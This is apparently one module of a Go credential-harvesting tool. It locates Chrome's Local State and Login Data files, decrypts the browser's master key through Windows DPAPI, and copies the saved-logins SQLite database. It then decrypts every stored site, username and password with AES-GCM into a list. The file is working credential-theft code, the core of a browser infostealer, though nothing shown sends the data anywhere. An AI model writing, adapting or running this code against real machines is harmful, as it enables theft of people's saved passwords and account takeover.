package browsers

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"os"

	"github.com/billgraziano/dpapi"
	_ "github.com/mattn/go-sqlite3"
)

var (
	CHROME_PATH_LOCAL_STATE = fmt.Sprintf("%s/Google/Chrome/User Data/Local State", LOCALAPPDATA);
	CHROME_PATH_LOGIN_DATA = fmt.Sprintf("%s/Google/Chrome/User Data/Default/Login Data", LOCALAPPDATA);
)


func Chrome() BrowserConfig{
	credentials := BrowserConfig{
		Browser: "chrome",
		Credentials: []Credential{},
	};

	secretKey, err := getSecretKey(CHROME_PATH_LOCAL_STATE);
	if err != nil {
		fmt.Println(err.Error());
		return credentials;
	}
	err = getLoginData(CHROME_PATH_LOGIN_DATA, secretKey, &credentials);
	if err != nil {
		fmt.Println(err.Error())
		return credentials;
	}

	return credentials;
}

// ****************************************************
// GET SECRET KEY
// ****************************************************
func getSecretKey(localStatePath string) ([]byte, error) {
	// Read the Local State file
	localState, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}

	// Parse the JSON from Local State
	var localStateData map[string]interface{}
	if err := json.Unmarshal(localState, &localStateData); err != nil {
		return nil, err
	}

	// Extract the encrypted_key from the Local State data
	osCrypt, ok := localStateData["os_crypt"].(map[string]interface{})
	if !ok {
		return nil, errors.New("os_crypt not found in Local State")
	}

	encryptedKey, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return nil, fmt.Errorf("encrypted_key not found in Local State")
	}
	encryptedKeyBytes, err := base64.StdEncoding.DecodeString(encryptedKey);
	if err != nil {
		return nil, err;
	}

	decryptedKeyBytes, err := decodeBrowserKey(encryptedKeyBytes[5:]);
	if err != nil {
		return nil, err;
	}

	// Ensure the key has a valid size (16, 24, or 32 bytes)
	if len(decryptedKeyBytes) != 16 && len(decryptedKeyBytes) != 24 && len(decryptedKeyBytes) != 32 {
		return nil, errors.New("invalid key size")
	}

	return decryptedKeyBytes, nil
}

func decodeBrowserKey(encryptedKey []byte) ([]byte, error) {
	decryptedKey, err := dpapi.DecryptBytes(encryptedKey);
	return decryptedKey, err;
}

// ****************************************************
// DECRYPT PASSWORD
// ****************************************************
func decryptPassword(ciphertext string, secretKey []byte) (string, error) {
	// Decode the raw ciphertext to obtain the byte slice
	ciphertextBytes := []byte(ciphertext)

	// Check if the ciphertext is long enough
	if len(ciphertextBytes) < 16 {
		return "", errors.New("invalid ciphertext length")
	}

	// Extract the initialization vector (IV) from the ciphertext
	initializationVector := ciphertextBytes[3:15]

	// Extract the encrypted password from the ciphertext
	encryptedPassword := ciphertextBytes[15: ]

	// Create a new AES cipher block with GCM mode
	block, err := aes.NewCipher(secretKey)
    if err != nil {
        return "", fmt.Errorf("error creating AES cipher: %v", err)
    }

	// Create a GCM cipher with the given block and initialization vector
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("error creating GCM cipher: %v", err)
	}

	// Decrypt the encrypted password using the GCM cipher
	decryptedPassword, err := aesGCM.Open(nil, initializationVector, encryptedPassword, nil)
	if err != nil {
		return "", fmt.Errorf("error decrypting password: %v", err)
	}

	// Convert the decrypted password byte slice to a string
	return string(decryptedPassword), nil
}

// ****************************************************
// GET LOGIN DATA
// ****************************************************
func getLoginData(loginDataPath string, secretKey []byte, credentials *BrowserConfig) error {
	// copy the Login Data sqlite3 file to a temp file
	tempFile, err := os.CreateTemp("", "chrome_login_data_*.db");
	if err != nil {
		fmt.Println(err.Error());
		return err;
	}
	defer os.Remove(tempFile.Name());
	fileBytes, err := os.ReadFile(loginDataPath);
	if err != nil {
		fmt.Println(err.Error());
		return err;
	}
	err = os.WriteFile(tempFile.Name(), fileBytes, 0644);
	if err != nil {
		fmt.Println(err.Error());
		return err;
	}

	// Connect to sqlite3 database
	db, err := sql.Open("sqlite3", tempFile.Name());
	if err != nil {
		fmt.Println(err.Error());
		return err;
	}
	defer db.Close();

	// Ping the database
	err = db.Ping();
	if err != nil {
		fmt.Println(err.Error());
		return err;
	}

	// Query the database
	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins");
	if err != nil {
		fmt.Println(err.Error());
		return err;
	}

	// Iterate over the rows
	for rows.Next() {
		var url string;
		var username string;
		var ciphertext string;

		err = rows.Scan(&url, &username, &ciphertext);
		if err != nil {
			fmt.Println(err.Error());
			return err;
		}

		// Decrypt the password
		password, err := decryptPassword(ciphertext, secretKey);
		if err != nil {
			fmt.Println(err.Error());
			return err;
		}

		// Add the credential to the list
		credentials.Credentials = append(credentials.Credentials, Credential{
			URL: url,
			Username: username,
			Password: password,
		});
	}

	return nil;
}